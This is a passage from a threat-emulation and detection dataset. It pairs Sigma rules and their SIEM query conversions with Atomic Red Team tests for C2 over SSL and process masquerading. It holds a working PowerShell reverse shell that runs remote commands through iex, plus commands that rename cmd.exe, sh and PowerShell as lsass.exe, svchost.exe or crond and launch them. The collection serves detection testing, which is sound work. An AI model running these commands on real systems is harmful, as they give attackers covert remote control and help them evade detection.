Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious service path modification\nid: 138d3531-8793-4f50-a2cd-f291b2863d78\ndescription: Detects service path modification to powershell/cmd\nstatus: experimental\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1031/T1031.yaml\ntags:\n    - attack.persistence\n    - attack.t1031\ndate: 2019/10/21\nmodified: 2019/11/10\nauthor: Victor Sergeev, oscd.community\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        Image|endswith: '\\sc.exe'\n        CommandLine|contains|all:\n            - 'config'\n            - 'binpath'\n    selection_2:\n        CommandLine|contains:\n            - 'powershell'\n            - 'cmd'\n    condition: selection_1 and selection_2\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\sc.exe AND CommandLine.keyword:*config* AND CommandLine.keyword:*binpath* AND CommandLine.keyword:(*powershell* OR *cmd*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-service-path-modification <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious service path modification\",\\n    \"description\": \"Detects service path modification to powershell/cmd\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1031\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\sc.exe AND CommandLine.keyword:*config* AND CommandLine.keyword:*binpath* AND CommandLine.keyword:(*powershell* OR *cmd*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\sc.exe AND CommandLine.keyword:*config* AND CommandLine.keyword:*binpath* AND CommandLine.keyword:(*powershell* OR *cmd*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious service path modification\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\sc.exe AND CommandLine.keyword:*config* AND CommandLine.keyword:*binpath* AND CommandLine.keyword:(*powershell* *cmd*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\sc.exe\" CommandLine=\"*config*\" CommandLine=\"*binpath*\" (CommandLine=\"*powershell*\" OR CommandLine=\"*cmd*\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\sc.exe\" CommandLine=\"*config*\" CommandLine=\"*binpath*\" CommandLine IN [\"*powershell*\", \"*cmd*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\sc\\\\.exe)(?=.*.*config.*)(?=.*.*binpath.*)(?=.*(?:.*.*powershell.*|.*.*cmd.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1032/T1032.yaml", "command": "$server_ip = 127.0.0.1\n$server_port = #{server_port}\n$socket = New-Object Net.Sockets.TcpClient('127.0.0.1', #{server_port})\n$stream = $socket.GetStream()\n$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$sslStream.AuthenticateAsClient('fake.domain', $null, \"Tls12\", $false)\n$writer = new-object System.IO.StreamWriter($sslStream)\n$writer.Write('PS ' + (pwd).Path + '> ')\n$writer.flush()\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data | Out-String ) 2>&1;\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}\n", "name": null}], "command_list": ["$server_ip = 127.0.0.1\n$server_port = #{server_port}\n$socket = New-Object Net.Sockets.TcpClient('127.0.0.1', #{server_port})\n$stream = $socket.GetStream()\n$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$sslStream.AuthenticateAsClient('fake.domain', $null, \"Tls12\", $false)\n$writer = new-object System.IO.StreamWriter($sslStream)\n$writer.Write('PS ' + (pwd).Path + '> ')\n$writer.flush()\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data | Out-String ) 2>&1;\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}\n"], "technique_id": "T1032", "parsed_datasets": [{"Atomic Red Team Test - Standard Cryptographic Protocol": {"display_name": "Standard Cryptographic Protocol", "atomic_tests": [{"description": "Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n", "supported_platforms": ["windows"], "name": "OpenSSL C2", "input_arguments": {"server_ip": {"default": "127.0.0.1", "type": "String", "description": "IP of the external server"}, "server_port": {"default": 443, "type": "String", "description": "The port to connect to on the external server"}}, "executor": {"elevation_required": false, "command": "$server_ip = #{server_ip}\n$server_port = #{server_port}\n$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', #{server_port})\n$stream = $socket.GetStream()\n$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))\n$sslStream.AuthenticateAsClient('fake.domain', $null, \"Tls12\", $false)\n$writer = new-object System.IO.StreamWriter($sslStream)\n$writer.Write('PS ' + (pwd).Path + '> ')\n$writer.flush()\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n$sendback = (iex $data | Out-String ) 2>&1;\n$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}\n", "name": "powershell"}}], "attack_technique": "T1032"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1036/T1036.yaml", "command": "cmd.exe /c copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\ncmd.exe /c %SystemRoot%\\Temp\\lsass.exe\n", "name": null}, {"source": "atomics/T1036/T1036.yaml", "command": "cp /bin/sh /tmp/crond\n/tmp/crond\n", "name": null}, {"source": "atomics/T1036/T1036.yaml", "command": "copy %SystemRoot%\\System32\\cscript.exe %APPDATA%\\notepad.exe /Y\ncmd.exe /c %APPDATA%\\notepad.exe /B\n", "name": null}, {"source": "atomics/T1036/T1036.yaml", "command": "copy %SystemRoot%\\System32\\wscript.exe %APPDATA%\\svchost.exe /Y\ncmd.exe /c %APPDATA%\\svchost.exe /B\n", "name": null}, {"source": "atomics/T1036/T1036.yaml", "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y\ncmd.exe /K %APPDATA%\\taskhostw.exe\n", "name": null}, {"source": "atomics/T1036/T1036.yaml", "command": "copy #{inputfile} ($env:TEMP + \"\\svchost.exe\")\n$myT1036 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id\nStop-Process -ID $myT1036\n", "name": null}, {"source": "atomics/T1036/T1036.yaml", "command": "copy PathToAtomicsFolder\\T1036\\bin\\t1036.exe ($env:TEMP + \"\\svchost.exe\")\n$myT1036 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id\nStop-Process -ID $myT1036\n", "name": null}, {"source": "atomics/T1036/T1036.yaml", "command": "copy #{inputfile} ($env:TEMP + \"\\svchost.exe\")\n$myT1036 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id\nStop-Process -ID $myT1036\n", "name": null}, {"source": "atomics/T1036/T1036.yaml", "command": "copy $env:ComSpec ($env:TEMP + \"\\svchost.exe\")\n$myT1036 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id\nStop-Process -ID $myT1036\n", "name": null}, {"source": "atomics/T1036/T1036.yaml", "command": "copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe\nC:\\lsm.exe /c echo T1036 > C:\\T1036.txt\n", "name": null}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\Recycle.bin", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\Users\\All Users\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\Users\\Default\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\Users\\Public\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\Perflogs\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\config\\systemprofile\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\Windows\\Fonts\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\Windows\\IME\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\Windows\\addins\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "*.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "\\ProgramData\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "csrsr.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "csrss.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "!=*\\Windows\\System32\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "cssrss.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "explorer.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "!=*\\Windows\\System32\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "iexplore.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "isass.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "lexplore.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "lsm.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "!=*\\Windows\\System32\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "lssass.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "mmc.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "!=*\\Windows\\System32\\", "name": "file_path"}, {"source": "Threat Hunting Tables", "command": "!=wininit.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "lsass", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "run32dll.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "rundII.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "scvhost.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "smss.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "!=services.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "svchost.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "svchosts.exe", "name": "parent_process"}], "command_list": ["cmd.exe /c copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\ncmd.exe /c %SystemRoot%\\Temp\\lsass.exe\n", "cp /bin/sh /tmp/crond\n/tmp/crond\n", "copy %SystemRoot%\\System32\\cscript.exe %APPDATA%\\notepad.exe /Y\ncmd.exe /c %APPDATA%\\notepad.exe /B\n", "copy %SystemRoot%\\System32\\wscript.exe %APPDATA%\\svchost.exe /Y\ncmd.exe /c %APPDATA%\\svchost.exe /B\n", "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y\ncmd.exe /K %APPDATA%\\taskhostw.exe\n", "copy #{inputfile} ($env:TEMP + \"\\svchost.exe\")\n$myT1036 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id\nStop-Process -ID $myT1036\n", "copy PathToAtomicsFolder\\T1036\\bin\\t1036.exe ($env:TEMP + \"\\svchost.exe\")\n$myT1036 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id\nStop-Process -ID $myT1036\n", "copy #{inputfile} ($env:TEMP + \"\\svchost.exe\")\n$myT1036 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id\nStop-Process -ID $myT1036\n", "copy $env:ComSpec ($env:TEMP + \"\\svchost.exe\")\n$myT1036 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id\nStop-Process -ID $myT1036\n", "copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe\nC:\\lsm.exe /c echo T1036 > C:\\T1036.txt\n", "*.exe", "\\Recycle.bin", "*.exe", "\\Users\\All Users\\", "*.exe", "\\Users\\Default\\", "*.exe", "\\Users\\Public\\", "*.exe", "\\Perflogs\\", "*.exe", "\\config\\systemprofile\\", "*.exe", "\\Windows\\Fonts\\", "*.exe", "\\Windows\\IME\\", "*.exe", "\\Windows\\addins\\", "*.exe", "\\ProgramData\\", "csrsr.exe", "csrss.exe", "!=*\\Windows\\System32\\", "cssrss.exe", "explorer.exe", "!=*\\Windows\\System32\\", "iexplore.exe", "isass.exe", "lexplore.exe", "lsm.exe", "!=*\\Windows\\System32\\", "lssass.exe", "mmc.exe", "!=*\\Windows\\System32\\", "!=wininit.exe", "lsass", "run32dll.exe", "rundII.exe", "scvhost.exe", "smss.exe", "!=services.exe", "svchost.exe", "svchosts.exe"], "technique_id": "T1036", "parsed_datasets": [{"Atomic Red Team Test - Masquerading": {"display_name": "Masquerading", "atomic_tests": [{"description": "Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe.\n", "supported_platforms": ["windows"], "name": "Masquerading as Windows LSASS process", "executor": {"elevation_required": false, "command": "cmd.exe /c copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\ncmd.exe /c %SystemRoot%\\Temp\\lsass.exe\n", "name": "command_prompt", "cleanup_command": "del /Q /F %SystemRoot%\\Temp\\lsass.exe >nul 2>&1\n"}}, {"description": "Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.\n", "supported_platforms": ["linux"], "name": "Masquerading as Linux crond process.", "executor": {"elevation_required": false, "command": "cp /bin/sh /tmp/crond\n/tmp/crond\n", "name": "sh"}}, {"description": "Copies cscript.exe, renames it, and launches it to masquerade as an instance of notepad.exe.\n", "supported_platforms": ["windows"], "name": "Masquerading - cscript.exe running as notepad.exe", "executor": {"elevation_required": false, "command": "copy %SystemRoot%\\System32\\cscript.exe %APPDATA%\\notepad.exe /Y\ncmd.exe /c %APPDATA%\\notepad.exe /B\n", "name": "command_prompt", "cleanup_command": "del /Q /F %APPDATA%\\notepad.exe >nul 2>&1\n"}}, {"description": "Copies wscript.exe, renames it, and launches it to masquerade as an instance of svchost.exe.\n", "supported_platforms": ["windows"], "name": "Masquerading - wscript.exe running as svchost.exe", "executor": {"elevation_required": false, "command": "copy %SystemRoot%\\System32\\wscript.exe %APPDATA%\\svchost.exe /Y\ncmd.exe /c %APPDATA%\\svchost.exe /B\n", "name": "command_prompt", "cleanup_command": "del /Q /F %APPDATA%\\svchost.exe >nul 2>&1\n"}}, {"description": "Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe.\n", "supported_platforms": ["windows"], "name": "Masquerading - powershell.exe running as taskhostw.exe", "executor": {"elevation_required": false, "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y\ncmd.exe /K %APPDATA%\\taskhostw.exe\n", "name": "command_prompt", "cleanup_command": "del /Q /F %APPDATA%\\taskhostw.exe >nul 2>&1\n"}}, {"dependencies": [{"description": "Exe file to copy must exist on disk at specified location (#{inputfile})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{inputfile}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/t1036.exe\" -OutFile \"#{inputfile}\"\n", "prereq_command": "if (Test-Path #{inputfile}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Masquerading - non-windows exe running as windows exe", "executor": {"elevation_required": false, "command": "copy #{inputfile} #{outputfile}\n$myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id\nStop-Process -ID $myT1036\n", "name": "powershell", "cleanup_command": "Remove-Item #{outputfile} -Force -ErrorAction Ignore\n"}, "description": "Copies an exe, renames it as a windows exe, and launches it to masquerade as a real windows exe\n", "input_arguments": {"outputfile": {"default": "($env:TEMP + \"\\svchost.exe\")", "type": "path", "description": "path of file to execute"}, "inputfile": {"default": "PathToAtomicsFolder\\T1036\\bin\\t1036.exe", "type": "path", "description": "path of file to copy"}}, "dependency_executor_name": "powershell"}, {"description": "Copies a windows exe, renames it as another windows exe, and launches it to masquerade as second windows exe\n", "supported_platforms": ["windows"], "name": "Masquerading - windows exe running as different windows exe", "input_arguments": {"outputfile": {"default": "($env:TEMP + \"\\svchost.exe\")", "type": "path", "description": "path of file to execute"}, "inputfile": {"default": "$env:ComSpec", "type": "path", "description": "path of file to copy"}}, "executor": {"elevation_required": false, "command": "copy #{inputfile} #{outputfile}\n$myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id\nStop-Process -ID $myT1036\n", "name": "powershell", "cleanup_command": "Remove-Item #{outputfile} -Force -ErrorAction Ignore\n"}}, {"description": "Detect LSM running from an incorrect directory and an incorrect service account\nThis works by copying cmd.exe to a file, naming it lsm.exe, then copying a file to the C:\\ folder.\n", "supported_platforms": ["windows"], "name": "Malicious process Masquerading as LSM.exe", "executor": {"elevation_required": true, "command": "copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe\nC:\\lsm.exe /c echo T1036 > C:\\T1036.txt\n", "name": "command_prompt", "cleanup_command": "del C:\\T1036.txt >nul 2>&1\ndel C:\\lsm.exe >nul 2>&1\n"}}], "attack_technique": "T1036"}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "\\Recycle.bin", "parent_process": "*.exe", "itw_sample": "", "chain_id": "100002", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "\\Users\\All Users\\", "parent_process": "*.exe", "itw_sample": "", "chain_id": "100003", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "\\Users\\Default\\", "parent_process": "*.exe", "itw_sample": "", "chain_id": "100004", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "\\Users\\Public\\", "parent_process": "*.exe", "itw_sample": "", "chain_id": "100005", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "\\Perflogs\\", "parent_process": "*.exe", "itw_sample": "", "chain_id": "100006", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "\\config\\systemprofile\\", "parent_process": "*.exe", "itw_sample": "", "chain_id": "100007", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "\\Windows\\Fonts\\", "parent_process": "*.exe", "itw_sample": "", "chain_id": "100008", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "\\Windows\\IME\\", "parent_process": "*.exe", "itw_sample": "", "chain_id": "100009", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "\\Windows\\addins\\", "parent_process": "*.exe", "itw_sample": "", "chain_id": "100010", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "\\ProgramData\\", "parent_process": "*.exe", "itw_sample": "", "chain_id": "100011", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "", "parent_process": "csrsr.exe", "itw_sample": "", "chain_id": "100021", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "!=*\\Windows\\System32\\", "parent_process": "csrss.exe", "itw_sample": "", "chain_id": "100022", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "", "parent_process": "cssrss.exe", "itw_sample": "", "chain_id": "100023", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "!=*\\Windows\\System32\\", "parent_process": "explorer.exe", "itw_sample": "", "chain_id": "100033", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "", "parent_process": "iexplore.exe", "itw_sample": "", "chain_id": "100035", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "", "parent_process": "isass.exe", "itw_sample": "", "chain_id": "100036", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "", "parent_process": "lexplore.exe", "itw_sample": "", "chain_id": "100037", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "!=*\\Windows\\System32\\", "parent_process": "lsm.exe", "itw_sample": "", "chain_id": "100038", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "", "parent_process": "lssass.exe", "itw_sample": "", "chain_id": "100039", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "!=*\\Windows\\System32\\", "parent_process": "mmc.exe", "itw_sample": "", "chain_id": "100040", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "", "parent_process": "!=wininit.exe", "itw_sample": "https://digital-forensics.sans.org/media/dfir_poster_2014.pdf", "chain_id": "100050", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "lsass", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "", "parent_process": "run32dll.exe", "itw_sample": "", "chain_id": "100071", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "", "parent_process": "rundII.exe", "itw_sample": "", "chain_id": "100072", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "", "parent_process": "scvhost.exe", "itw_sample": "", "chain_id": "100075", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "", "parent_process": "smss.exe", "itw_sample": "", "chain_id": "100077", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "", "parent_process": "!=services.exe", "itw_sample": "", "chain_id": "100078", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "svchost.exe", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1036", "file_value": "", "file_path": "", "parent_process": "svchosts.exe", "itw_sample": "", "chain_id": "100079", "registry_value": "", "mitre_caption": "masquerading", "registry_path": "", "frequency": "rare", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_path contains \".doc.\"or process_path contains \".docx.\"or process_path contains \".xls.\"or process_path contains \".xlsx.\"or process_path contains 